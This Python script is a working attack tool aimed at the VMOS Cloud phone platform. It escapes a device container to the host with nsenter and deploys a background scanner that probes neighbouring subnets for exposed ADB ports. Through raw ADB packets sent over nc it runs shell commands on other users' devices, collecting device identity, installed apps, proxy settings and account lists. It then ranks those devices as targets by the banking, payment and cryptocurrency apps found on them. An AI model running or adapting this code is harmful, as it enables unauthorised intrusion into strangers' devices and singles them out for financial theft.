#!/usr/bin/env python3
"""
Mass ADB Neighbor Scan & Data Extraction
Background scan approach: launch on device, poll for results.
"""
import asyncio
import json
import sys
import os
import base64
import struct
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE = "https://api.vmoscloud.com"
PAD = "ATP6416I3JJRXL3V"
DELAY = 3.5


async def sh(c, cmd, t=30):
    await asyncio.sleep(DELAY)
    r = await c.sync_cmd(pad_code=PAD, command=cmd, timeout_sec=t)
    d = r.get("data", {})
    if isinstance(d, list) and d:
        e = d[0]
        return (e.get("errorMsg", "") or "").strip() if isinstance(e, dict) else str(e)
    return str(d)


async def nsh(c, cmd, t=30):
    """Execute on host via nsenter."""
    e = cmd.replace("'", "'\\''")
    return await sh(c, f"nsenter -t 1 -m -u -i -n -p -- sh -c '{e}'", t)


def adb_pkt(cmd_id, arg0, arg1, data=b""):
    """Build an ADB protocol packet."""
    return struct.pack(
        "<IIIIII", cmd_id, arg0, arg1, len(data),
        sum(data) & 0xFFFFFFFF, cmd_id ^ 0xFFFFFFFF
    ) + data


def build_cnxn_open(shell_cmd):
    """Build CNXN + OPEN binary packet for a shell command."""
    CNXN = 0x4E584E43
    OPEN = 0x4E45504F
    cnxn = adb_pkt(CNXN, 0x01000001, 0x00040000, b"host::\x00")
    opn = adb_pkt(OPEN, 1, 0, f"shell:{shell_cmd}\x00".encode())
    return cnxn + opn


async def adb_exec(c, ip, shell_cmd, timeout=5):
    """Execute shell command on neighbor via ADB raw protocol."""
    pkt = build_cnxn_open(shell_cmd)
    b64 = base64.b64encode(pkt).decode()
    # Write packet, send with timing, extract text
    cmd = (
        f"echo {b64} | base64 -d > /data/local/tmp/c.bin; "
        f"echo {b64} | base64 -d | head -c 31 > /data/local/tmp/cn.bin; "
        f"echo {b64} | base64 -d | tail -c +32 > /data/local/tmp/op.bin; "
        f"{{ cat /data/local/tmp/cn.bin; sleep 0.3; cat /data/local/tmp/op.bin; sleep {timeout}; }} "
        f"| nc -w {timeout+1} {ip} 5555 > /data/local/tmp/ar 2>/dev/null; "
        f"strings /data/local/tmp/ar | "
        f"grep -vE '^(host::|device::|shell,|CNXN|OPEN|WRTE|OKAY|CLSE)' | head -100"
    )
    return await nsh(c, cmd, t=timeout + 15)


async def deploy_scanner(c):
    """Deploy the background scanner script to the device."""
    # Write a comprehensive scan script via base64
    scanner = """#!/system/bin/sh
# Background ADB subnet scanner
# Usage: bg_scan.sh <output_file> <subnet_list>
# subnet_list format: "53 1 2 11 27 41 45 74 80"
OUT="$1"; shift
SUBNETS="$@"
> "$OUT"
for SUBNET in $SUBNETS; do
    BASE="10.10.${SUBNET}"
    for i in $(seq 40 200); do
        IP="${BASE}.${i}"
        (printf '\\x43\\x4e\\x58\\x4e\\x01\\x00\\x00\\x01\\x00\\x00\\x04\\x00\\x07\\x00\\x00\\x00\\x32\\x02\\x00\\x00\\xbc\\xb1\\xa7\\xb1host::\\x00' | nc -w 1 "$IP" 5555 2>/dev/null | head -c 200 | strings | head -3 > "/data/local/tmp/pr_${SUBNET}_${i}" && grep -q CNXN "/data/local/tmp/pr_${SUBNET}_${i}" && echo "ADB:${IP}:$(cat /data/local/tmp/pr_${SUBNET}_${i} | grep device:: | head -1)" >> "$OUT"; rm -f "/data/local/tmp/pr_${SUBNET}_${i}") &
        # 30 parallel probes per subnet
        [ $((i % 30)) -eq 0 ] && wait
    done
    wait
    echo "SUBNET_DONE:${SUBNET}" >> "$OUT"
done
echo "SCAN_COMPLETE" >> "$OUT"
"""
    b64 = base64.b64encode(scanner.encode()).decode()
    r = await nsh(c, f"echo {b64} | base64 -d > /data/local/tmp/bg_scan.sh && chmod 755 /data/local/tmp/bg_scan.sh && echo OK")
    print(f"  Scanner deployed: {r}")
    return "OK" in r


async def launch_scan(c, subnets, output_file="/data/local/tmp/scan_results.txt"):
    """Launch background scan and return immediately."""
    subnet_str = " ".join(str(s) for s in subnets)
    # nohup it so it runs even after API timeout
    cmd = f"nohup sh /data/local/tmp/bg_scan.sh {output_file} {subnet_str} &"
    await nsh(c, cmd)
    print(f"  Background scan launched for subnets: {subnet_str}")


async def poll_scan(c, output_file="/data/local/tmp/scan_results.txt"):
    """Poll scan results file."""
    r = await nsh(c, f"cat {output_file} 2>/dev/null")
    return r


async def get_arp_neighbors(c):
    """Get ARP table to find active subnets."""
    r = await nsh(c, "ip neigh show | grep -v FAILED | sort")
    return r


async def main():
    c = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE)

    print("=" * 70)
    print("  MASS ADB NEIGHBOR SCAN & DATA EXTRACTION")
    print("=" * 70)

    # Step 1: Deploy scanner
    print("\n[1] Deploying background scanner...")
    ok = await deploy_scanner(c)
    if not ok:
        print("  FAILED to deploy scanner")
        return

    # Step 2: Get ARP table
    print("\n[2] ARP neighbor table...")
    arp = await get_arp_neighbors(c)
    print(f"  {arp[:600]}")

    # Step 3: Launch scan on key subnets
    # Start with local subnet and known active ones
    subnets = [53, 1, 2, 11, 27, 41, 45, 74, 80]
    print(f"\n[3] Launching background scan on {len(subnets)} subnets...")
    await launch_scan(c, subnets)

    # Step 4: Poll for results (the scan runs on device, we just check periodically)
    print("\n[4] Polling for results...")
    all_hosts = []
    for attempt in range(15):
        # Wait via API calls (don't use sleep alone, keep API active)
        await sh(c, "echo heartbeat")
        
        results = await poll_scan(c)
        lines = results.strip().split("\n") if results.strip() else []
        
        adb_hosts = [l for l in lines if l.startswith("ADB:")]
        done_subnets = [l for l in lines if l.startswith("SUBNET_DONE:")]
        complete = any("SCAN_COMPLETE" in l for l in lines)
        
        print(f"  Poll {attempt+1}: {len(adb_hosts)} hosts found, {len(done_subnets)} subnets done, complete={complete}")
        
        if complete:
            all_hosts = adb_hosts
            break
    
    # Step 5: Parse results
    print(f"\n[5] Parsing {len(all_hosts)} ADB hosts...")
    neighbors = {}
    for line in all_hosts:
        parts = line.split(":")
        if len(parts) >= 2:
            ip = parts[1]
            banner = ":".join(parts[2:]) if len(parts) > 2 else ""
            neighbors[ip] = {"banner": banner}
            print(f"  {ip} — {banner[:80]}")

    # Step 6: Extract data from each neighbor
    if neighbors:
        print(f"\n[6] Extracting data from {len(neighbors)} neighbors...")
        
        for ip in sorted(neighbors.keys()):
            if ip == "10.10.53.148":
                continue  # Skip ourselves
            
            print(f"\n  --- {ip} ---")
            
            # Identity
            ident = await adb_exec(c, ip, "getprop ro.product.model; getprop ro.product.brand; getprop ro.build.fingerprint; getprop ro.serialno", 4)
            neighbors[ip]["identity"] = ident
            
            # 3rd party apps
            apps = await adb_exec(c, ip, "pm list packages -3 2>/dev/null", 6)
            neighbors[ip]["apps"] = apps
            
            # Proxy/network
            proxy = await adb_exec(c, ip, "settings get global http_proxy; getprop persist.sys.http_proxy; ip route show default; cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -i proxy | head -5", 5)
            neighbors[ip]["proxy"] = proxy
            
            # VPN/OwlProxy
            vpn = await adb_exec(c, ip, "dumpsys connectivity 2>/dev/null | grep -E 'VPN|vpn|proxy|Proxy' | head -10; ls /data/data/com.owlproxy.overseas/shared_prefs/ 2>/dev/null", 5)
            neighbors[ip]["vpn"] = vpn
            
            # Accounts
            accts = await adb_exec(c, ip, "dumpsys account 2>/dev/null | head -30", 5)
            neighbors[ip]["accounts"] = accts
            
            # Print summary
            lines = ident.split("\n") if ident else []
            model = lines[0] if lines else "?"
            app_count = len([l for l in (apps or "").split("\n") if "package:" in l])
            has_proxy = "YES" if proxy and ":" in proxy and "null" not in proxy.lower() else "NO"
            print(f"  Model={model} | Apps={app_count} | Proxy={has_proxy}")

    # Step 7: Save report
    print(f"\n[7] Saving report...")
    report = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "platform": PAD,
        "total_neighbors": len(neighbors),
        "neighbors": {}
    }
    for ip, data in neighbors.items():
        # Score: high-value apps
        HV = ["walletnfcrel", "paypal", "venmo", "cash", "chime", "wise", "revolut",
               "coinbase", "binance", "bybit", "robinhood", "zelle", "wellsfargo",
               "chase", "bankofamerica", "citi", "usaa", "capitalone", "amex",
               "discover", "sofi", "affirm", "klarna", "afterpay", "samsung.android.spay"]
        score = 0
        hv_found = []
        for pkg in HV:
            if pkg in (data.get("apps") or "").lower():
                score += 10
                hv_found.append(pkg)
        if data.get("proxy") and ":" in (data.get("proxy") or "") and "null" not in (data.get("proxy") or "").lower():
            score += 15
        
        report["neighbors"][ip] = {
            "identity": data.get("identity", "")[:300],
            "apps": data.get("apps", "")[:500],
            "proxy": data.get("proxy", "")[:300],
            "vpn": data.get("vpn", "")[:300],
            "accounts": data.get("accounts", "")[:300],
            "score": score,
            "high_value_apps": hv_found,
        }
    
    with open("neighbor_recon_report.json", "w") as f:
        json.dump(report, f, indent=2)
    print(f"  Saved to neighbor_recon_report.json")
    
    # Print ranked summary
    ranked = sorted(report["neighbors"].items(), key=lambda x: x[1]["score"], reverse=True)
    print(f"\n{'='*70}")
    print(f"  TARGET RANKINGS")
    print(f"{'='*70}")
    print(f"  {'Rank':<5} {'IP':<18} {'Score':<7} {'HV Apps'}")
    for i, (ip, data) in enumerate(ranked[:30], 1):
        hv = ", ".join(data["high_value_apps"][:3]) or "-"
        px = " [PROXY]" if data["score"] >= 15 and ":" in data.get("proxy", "") else ""
        print(f"  {i:<5} {ip:<18} {data['score']:<7} {hv}{px}")
    
    print(f"\n  TOTAL: {len(neighbors)} neighbors mapped")
    print(f"  PROXIES: {sum(1 for d in report['neighbors'].values() if ':' in d.get('proxy','') and 'null' not in d.get('proxy','').lower())}")


if __name__ == "__main__":
    asyncio.run(main())
